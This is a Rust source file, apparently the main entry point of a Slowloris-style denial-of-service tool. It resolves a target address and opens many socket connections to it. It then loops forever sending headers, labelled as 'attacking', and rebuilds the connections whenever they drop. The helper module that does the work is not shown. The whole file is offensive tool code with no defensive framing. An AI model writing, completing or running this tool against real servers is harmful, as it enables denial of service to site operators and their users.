mod arg_parser;
mod attacker;

use arg_parser::{Args, Parser};
use std::{thread::sleep, time::Duration};

fn main() {
    // Parse arguments
    let args = Args::parse();

    // Resolve addresses
    println!("[*] Resolving address");
    let addr = match attacker::resolve_address(args.target) {
        Ok(a) => a,
        Err(e) => {
            println!("[!] Error resolving address ---- {}", e);
            std::process::exit(1);
        }
    };

    let mut streams;
    match attacker::new_batch(addr, args.port, args.socket_num) {
        Ok(s) => streams = s,
        Err(_) => std::process::exit(1),
    }

    // Enter attack cycle
    loop {
        println!("[*] Attacking");
        match attacker::send_headers(&mut streams, args.randheaders) {
            Ok(_) => (),
            Err(e) => {
                println!("[!] Error during header send ---- {}", e);
                println!("[*] Rebuilding connections");
                match attacker::new_batch(addr, args.port, args.socket_num) {
                    Ok(s) => streams = s,
                    Err(_) => std::process::exit(1),
                }
            }
        }
        sleep(Duration::from_millis(args.delay));
    }
}
